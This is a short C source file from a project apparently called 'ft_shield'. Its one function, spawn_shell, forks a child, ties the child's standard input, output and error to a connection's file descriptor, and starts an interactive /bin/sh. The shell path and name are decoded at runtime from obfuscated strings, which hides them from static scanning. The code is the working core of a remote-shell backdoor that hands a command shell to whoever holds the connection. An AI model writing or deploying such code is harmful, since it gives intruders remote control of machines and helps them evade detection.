#include "ft_shield.h"

void	spawn_shell(int fd)
{
	pid_t	pid;

	pid = fork();
	if (pid < 0)
	{
		close(fd);
		return ;
	}
	if (pid == 0)
	{
		char	path[STRENC_MAX + 1];
		char	arg0[STRENC_MAX + 1];

		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		if (fd > STDERR_FILENO)
			close(fd);
		str_dec(STR_BINSH, path);
		str_dec(STR_SH, arg0);
		execve(path, (char *[]){arg0, "-i", NULL}, environ);
		_exit(1);
	}
	close(fd);
}
